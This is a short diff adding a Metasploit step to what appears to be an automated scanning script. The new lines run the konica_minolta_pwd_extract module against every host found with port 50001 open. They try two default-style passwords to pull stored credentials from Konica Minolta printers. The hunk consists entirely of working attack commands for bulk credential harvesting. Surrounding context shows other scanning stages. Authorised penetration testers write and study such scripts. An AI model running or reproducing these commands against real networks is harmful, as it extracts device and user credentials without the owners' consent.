@@ -190,6 +190,16 @@ services -u -p 9100 -R
 run
 sleep 5
 
+echo "Konica Minolta PW extractor"
+use auxiliary/gather/konica_minolta_pwd_extract
+set passwd 12345678
+services -u -p 50001 -R
+run
+sleep 5
+set passwd 1234567812345678
+run
+sleep 5
+
 spool /root/output/msf/vmware.txt
 echo "####VMware#####"
 
